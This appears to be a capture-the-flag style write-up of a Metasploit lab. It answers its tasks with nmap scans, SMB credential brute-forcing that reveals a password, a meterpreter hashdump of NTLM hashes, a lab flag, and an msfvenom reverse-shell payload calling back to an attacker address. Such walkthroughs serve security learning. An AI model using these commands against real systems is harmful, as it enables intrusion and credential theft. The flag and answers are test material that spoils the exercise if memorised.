<details><summary>Task 2 Scanning</summary>

####    How many ports are open on the target system?
```bash
msf6 > nmap 10.10.86.173 -sC -sV
[*] exec: nmap 10.10.86.173 -sC -sV

Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 03:53 CDT
Nmap scan report for 10.10.86.173
Host is up (0.33s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5e
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ff:6f:c6:f7:f1:5a:8d:7e:0d:6a:7d:06:67:7d:25:16 (RSA)
|   256 f8:2e:7b:18:ca:c2:fd:f1:45:87:84:07:98:6a:10:97 (ECDSA)
|_  256 1b:10:9f:e7:08:ca:4a:ab:e2:5d:49:eb:d1:6c:85:ae (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: ACME IT SUPPORT)
8000/tcp open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/plain).
Service Info: Host: IP-10-10-86-173; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-05-29T08:53:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: IP-10-10-86-173, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: ip-10-10-86-173
|   NetBIOS computer name: IP-10-10-86-173\x00
|   Domain name: eu-west-1.compute.internal
|   FQDN: ip-10-10-86-173.eu-west-1.compute.internal
|_  System time: 2022-05-29T08:53:37+00:00

```
`5`

####    Using the relevant scanner, what NetBIOS name can you see?
```bash

msf6 auxiliary(scanner/netbios/nbname) > run

[*] Sending NetBIOS requests to 10.10.86.173->10.10.86.173 (1 hosts)
background
[+] 10.10.86.173 [IP-10-10-86-173] OS:Unix Names:(IP-10-10-86-173, __MSBROWSE__, 'ACME IT SUPPORT') Addresses:(10.10.86.173) Mac:00:00:00:00:00:00 

```

####    What is running on port 8000?
`WebFS/1.21`
####    What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
```bash
sf6 auxiliary(scanner/smb/smb_enumusers) > search smb login

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/windows/smb/ms04_007_killbill          2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   1  exploit/windows/smb/smb_relay                  2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/smb_shadow                 2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
   4  'auxiliary/scanner/smb/smb_login                                 normal     No     SMB Login Check Scanner'
   5  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                   normal     No     SMB NTLMv1 Login Request Corruption


Interact with a module by name or index. For example info 5, use 5 or use auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt

[+] 10.10.86.173:445      - 10.10.86.173:445 - Success: '.\penny:leo1234'

```
</details>

<details><summary>Task 3 - The Metasploit Database </summary>

`systemctl start postgresql`


Then you will need to initialize the Metasploit Database using the `msfdb init` command. 

`msfconsole` and check the database status using the `db_status`

add a `workspace` using the `-a`parameter or delete a workspace using the `-d` parameter

</details>

   <details><summary>Task 4 - Vulnerability Scanning</summary>

### Who wrote the module that allows us to check SMTP servers for open relay?

```bash
msf6 > search smtp relay

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_relay                   normal  No     SMTP Open Relay Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_relay

msf6 > info 0

       Name: SMTP Open Relay Detection
     Module: auxiliary/scanner/smtp/smtp_relay
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Campbell Murray
  xistence <xistence@0x90.nl>

Check supported:
  No

Basic options:
  Name      Current Setting     Required  Description
  ----      ---------------     --------  -----------
  EXTENDED  false               yes       Do all the 16 extended checks
  MAILFROM  sender@example.com  yes       FROM address of the e-mail
  MAILTO    target@example.com  yes       TO address of the e-mail
  RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT     25                  yes       The target port (TCP)
  THREADS   1                   yes       The number of concurrent threads (max one per host)

Description:
  This module tests if an SMTP server will accept (via a code 250) an 
  e-mail by using a variation of testing methods. Some of the extended 
  methods will try to abuse configuration or mailserver flaws.

References:
  http://www.ietf.org/rfc/rfc2821.txt
  https://svn.nmap.org/nmap/scripts/smtp-open-relay.nse

```

</details>

<details><summary>Task 5 - Exploitation</summary>


##  Exploit one of the critical vulnerabilities on the target VM
```bash
nmap 10.10.26.244 -sV -sC -T5    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 05:59 CDT
Warning: 10.10.26.244 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.26.244
Host is up (0.32s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
416/tcp   filtered silverplatter
445/tcp   open     microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-05-28T10:44:40
|_Not valid after:  2022-11-27T10:44:40
|_ssl-date: 2022-05-29T11:01:21+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-05-29T11:01:13+00:00
4001/tcp  filtered newoak
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49158/tcp open     msrpc         Microsoft Windows RPC
49159/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:ad:34:78:75:25 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-29T06:01:12-05:00
| smb2-time: 
|   date: 2022-05-29T11:01:12
|_  start_date: 2022-05-29T10:44:31
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required


```

### What is the content of the flag.txt file?
`THM-5455554845`

### What is the NTLM hash of the password of the user "pirate"?

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
```


</details> 

<details><summary>Task 6 - msfvenom </summary>

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.17.63.134 LPORT=7777 -f elf > rev_shell.elf

python3 -m http.server 9001         
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...

```
</details>
